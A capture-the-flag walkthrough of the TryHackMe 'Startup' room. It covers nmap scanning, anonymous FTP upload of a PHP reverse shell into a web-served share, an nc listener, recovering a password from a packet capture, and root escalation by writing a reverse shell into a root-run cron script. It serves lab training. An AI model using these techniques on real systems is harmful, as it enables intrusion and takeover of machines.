**THM** : Startup<br>
**Room Link** : https://tryhackme.com/room/startup<br>
**Difficulty** : Easy <br>
**Flags to capture** : User and Root<br>
**Key Topics, Techniques, and Tools** : <br>
 - Ports and Services scan : [nmap](https://nmap.org/)
 - Web content discovery : [gobuster](https://github.com/OJ/gobuster)
 - Linux process snooping : [pspy](https://github.com/DominicBreuker/pspy)
 - Linux privileges escalation
 - Bash scripting 

<p align="center">   <img src="https://i.imgur.com/1FUQoZ6.png"> </p>  

# Summary

- [Adding IP to the hosts file](#adding-ip-to-the-hosts-file)
- [Nmap scan](#nmap-scan)
- [FTP enumeration](#ftp-enumeration)
- [Web content discovery](#web-content-discovery)
- [User flag](#user-flag)
- [Privilege escalation](#privilege-escalation)

<p align="center">   <img src="https://i.imgur.com/Kmtrf12.png"> </p> 

## Adding IP to the hosts file 
I start by adding the IP of the machine to my hosts file:<br>
```
echo " 10.10.44.1 startup.thm"|sudo tee -a /etc/hosts
```   

## Nmap scan

I perform an `Nmap` scan on the target host and save the output to a file called `nmapResults.txt` <br>
The scan includes all ports `-p-` and uses aggressive scan options `-A` <br>

```
└─# nmap startup.thm -A -p- -oN nmapResults.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 17:29 CEST
Nmap scan report for startup.thm (10.10.44.1)
Host is up (0.031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.75.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9a60b841d2201a401304843612bab94 (RSA)
|   256 ec13258c182036e6ce910e1626eba2be (ECDSA)
|_  256 a2ff2a7281aaa29f55a4dc9223e6b43f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
|_http-server-header: Apache/2.4.18 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/14%OT=21%CT=1%CU=39549%PV=Y%DS=2%DC=T%G=Y%TM=6460FEA
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   30.37 ms 10.8.0.1
2   30.56 ms startup.thm (10.10.44.1)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.59 seconds
```

There are 3 open ports :
- `FTP` - `vsftpd 3.0.3` on port `21`
- `SSH` - `OpenSSH 7.2p2` on port `22`
- `HTTP` - `Apache httpd 2.4.18` on port `80` 
<br>

I see that the anonymous login is enabled so I decided to log on and see what interesting information I could find.

## FTP enumeration
I log on to the FTP server using `anonymous:anonymous` as username and password :

```
└─# ftp startup.thm 
Connected to startup.thm.
220 (vsFTPd 3.0.3)
Name (startup.thm:bilnax): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

In the FTP share there is a `ftp` directory on which I have write permission. There are also two files: `important.jpg` and `notice.txt` that I get : 

```
ftp> ls
229 Entering Extended Passive Mode (|||63314|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get important.jpg 
local: important.jpg remote: important.jpg
229 Entering Extended Passive Mode (|||54466|)
150 Opening BINARY mode data connection for important.jpg (251631 bytes).
100% |****************************************************************************|   245 KiB    0.99 MiB/s    00:00 ETA
226 Transfer complete.
251631 bytes received in 00:00 (896.77 KiB/s)
ftp> get notice.txt
local: notice.txt remote: notice.txt
229 Entering Extended Passive Mode (|||30976|)
150 Opening BINARY mode data connection for notice.txt (208 bytes).
100% |****************************************************************************|   208      953.63 KiB/s    00:00 ETA
226 Transfer complete.
208 bytes received in 00:00 (6.27 KiB/s)
```

The files don't look very usable but the message included in the `notice.txt` file indicates that apparently the directory is accessible from the web site -> which could allow me to use a reverse shell since I have write permission on the `ftp` directory : 
```
└─# cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

So I will take a look at the website.

## Web Content Discovery
The home page simply indicates that the site is under development : 

<img src="https://imgur.com/R4Pyvs5.png">

And the source code contains no interesting information :

<img src="https://i.imgur.com/dE5TOAo.png">



So I decide to run a `gobuster` scan to enumerate the web server :

```
└─# gobuster dir -u http://startup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://startup.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/18 17:09:51 Starting gobuster in directory enumeration mode
===============================================================
/files                (Status: 301) [Size: 310] [--> http://startup.thm/files/]
```

There is a directory named `/files` that looks interesting, let's take a look at it : 

<img src="https://i.imgur.com/RGZpf3u.png">

The directory contains the same content as the FTP share. It would appear that the latter is accessible from the web site. I therefore choose to place a php reverse shell in the `ftp/` directory to run it from the website :

```
ftp> put revshell.php 
local: revshell.php remote: revshell.php
229 Entering Extended Passive Mode (|||58360|)
150 Ok to send data.
100% |****************************************************************************|  2582        1.48 MiB/s    00:00 ETA
226 Transfer complete.
2582 bytes sent in 00:00 (38.18 KiB/s)
```

<img src="https://i.imgur.com/c5ZcWoQ.png">

So I get a shell as `www-data` :

```
└─# nc -lvnp 9494
listening on [any] 9494 ...
connect to [10.8.75.8] from (UNKNOWN) [10.10.62.150] 50418
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 15:26:56 up 47 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## User flag
I retrieve the first flag that contains the secret ingredient from the `/recipe.txt` file :

```
www-data@startup:/$ cat recipe.txt 
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

Now let's get the user.txt flag.  
There is the `home` directory of user `lennie`, to which we have no rights :
```
www-data@startup:/home$ ls -la
total 12
drwxr-xr-x  3 root   root   4096 Nov 12  2020 .
drwxr-xr-x 25 root   root   4096 May 18 14:39 ..
drwx------  4 lennie lennie 4096 Nov 12  2020 lennie
```

There is a `Wireshark` capture named `suspicious.pcapng` contained in the directory `/incidents` :

```
www-data@startup:/incidents$ ls -la
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 May 18 14:39 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```
I retrieve it via a command to set up a web server with `python3` :

``` 
www-data@startup:/incidents$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 ...
```

I receive the capture and open it with `Wireshark` to exploit it :
```
└─# wget http://startup.thm:8000/suspicious.pcapng
--2023-05-18 17:46:40--  http://startup.thm:8000/suspicious.pcapng
Résolution de startup.thm (startup.thm)… 10.10.62.150
Connexion à startup.thm (startup.thm)|10.10.62.150|:8000… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 31224 (30K) [application/octet-stream]
Sauvegarde en : « suspicious.pcapng »

suspicious.pcapng              100%[=================================================>]  30,49K  --.-KB/s    ds 0,07s   

2023-05-18 17:46:40 (444 KB/s) — « suspicious.pcapng » sauvegardé [31224/31224]
                                                                                                                        
┌──(root㉿kali)-[/home/bilnax/Téléchargements/CTF/Startup]
└─# open suspicious.pcapng 
```

Wireshark excutes :
<img src="https://i.imgur.com/90r4b54.png">

By following a TCP flow, I find what seem to be the logs of a reverse shell :
<img src="https://i.imgur.com/u08ErEP.png">

In the logs is a password in clear text that the person tried to enter for the user `www-data`, but it is incorect :  

<img src="https://i.imgur.com/YZlQOry.png">

I decide to test it anyway and it turns out to be incorrect. I then try to connect via ssh with the user `lennie` using the password which turns out to be the correct one :

```
└─# ssh lennie@startup.thm   
lennie@startup.thm's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

44 packages can be updated.
30 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami
lennie
```

So I retrieve the `user.txt` flag :
```
lennie@startup:~$ cat user.txt 
THM{*******************************}
```

## Privilege escalation
I'm now trying to root the machine in order to recover the root flag.

I start by checking what the current user can run with sudo access :
```
lennie@startup:~$ sudo -l
sudo: unable to resolve host startup
[sudo] password for lennie: 
Sorry, user lennie may not run sudo on startup.
``` 

The user can't run sudo on the machine.  
In the `/home/lennie` directory is also a `scripts` directory. In the latter is a script named `planner.sh` on which I have read and execute rights, and a `startup_list.txt` file :

```
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 May 18 16:28 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 May 18 16:41 startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The `planner.sh` script executes a second script named `/etc/print.sh`. So I'm going to check its contents and the rights applied to it :

```
lennie@startup:~/scripts$ cat /etc/print.sh 
#!/bin/bash
echo "Done!"
lennie@startup:~/scripts$ ls -la /etc/print.sh 
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
```

The `print.sh` script simply displays the `Done!` string, but it belongs to the `lennie` user, so I can modify it.  
The name of the first script, `planner.sh`, leads me to believe that it is executed in a planned way, perhaps by the root user.  
I therefore choose to check this with the `pspy` tool, which allows you to monitor processes on Linux :

<img src="https://i.imgur.com/oiodbPT.png">

With `pspy`, I confirm that the `planner.sh` script is executed by the `root` user (UID=0).  
I then choose to modify the `print.sh` file in order to add a reverse shell and obtain a root shell when executed by the root user :

<img src="https://i.imgur.com/4HJXqU0.png">

I receive a root shell on the specified listening port and can retrieve the `root.txt` flag :
```
# whoami
root
# ls
root.txt
# cat root.txt  
THM{{*******************************}}
```